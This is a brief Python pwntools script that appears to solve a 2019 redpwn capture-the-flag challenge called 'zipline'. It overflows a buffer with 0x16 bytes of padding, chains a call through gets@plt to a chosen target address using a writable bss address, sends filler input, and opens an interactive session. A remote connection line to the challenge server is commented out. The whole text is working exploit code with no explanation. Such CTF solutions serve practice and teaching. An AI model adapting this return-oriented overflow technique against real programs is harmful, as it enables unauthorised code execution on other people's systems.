from pwn import *

r = process('./zipline')
#r = remote('chall.2019.redpwn.net', 4005)

gets_plt = 0x8049060
bss = 0x0804c000
target = 0x08049569

payload = 'a'*0x16 + flat(gets_plt, target, bss+0x40)
r.sendlineafter('?', payload)
r.sendline('a'*0x100)

r.interactive()